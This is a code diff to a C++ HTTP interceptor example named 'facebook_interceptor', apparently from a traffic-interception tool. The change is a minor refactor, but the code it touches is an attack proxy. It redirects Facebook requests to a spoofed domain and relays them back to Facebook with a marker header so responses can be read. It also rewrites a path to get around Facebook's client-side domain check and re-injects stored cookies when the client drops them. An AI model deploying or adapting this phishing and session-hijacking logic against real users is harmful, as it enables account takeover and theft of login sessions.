@@ -10,7 +10,7 @@
 namespace interceptors::examples {
     void facebook_interceptor::on_http_connect(connection_flow &flow, http::exchange &exch) {
         http::request &req = exch.request();
-        http::url target = req.get_target();
+        const http::url &target = req.get_target();
 
         // Starting an HTTPS connection, make sure it connects to the existing server
         if (target.is_host(spoofed_site)) {
@@ -20,19 +20,20 @@ namespace interceptors::examples {
 
     void facebook_interceptor::on_http_request(connection_flow &flow, http::exchange &exch) {
         http::request &req = exch.request();
-        http::url target = req.get_target();
+        const http::url &target = req.get_target();
 
         // Redirect Facebook to our site
         // Pages that use an absolute link will have to go through the redirect first
         if (target.is_host(facebook_site)) {
-            target.netloc.host = spoofed_site;
-            if (target.scheme.empty()) {
-                target.scheme = "https";
+            http::url new_target = target;
+            new_target.netloc.host = spoofed_site;
+            if (new_target.scheme.empty()) {
+                new_target.scheme = "https";
             }
 
             http::response &res = exch.make_response();
             res.set_status(http::status::found);
-            res.set_header_to_value("Location", target.absolute_string());
+            res.set_header_to_value("Location", new_target.absolute_string());
             res.set_content_length();
         }
         else if (target.is_host(spoofed_site)) {
@@ -45,18 +46,20 @@ namespace interceptors::examples {
                 return;
             }
             else {
+                http::url new_target = target;
+
                 // Mark the request with a header so we can view the response later
                 req.add_header(marker);
 
                 // Direct request to Facebook
-                target.netloc.host = facebook_site;
+                new_target.netloc.host = facebook_site;
 
                 // Facebook client checks the site domain it is being served on when fetching this resource
-                if (target.path == "/intern/common/referer_frame.php") {
-                    target.path = "/common/referer_frame.php";
+                if (new_target.path == "/intern/common/referer_frame.php") {
+                    new_target.path = "/common/referer_frame.php";
                 }
 
-                req.update_target(target);
+                req.update_target(new_target);
 
                 // Facebook client also tries to remove the Cookie header when the site domain is off for a single critical request
                 if (!req.has_header("Cookie") && !cookies.empty()) {
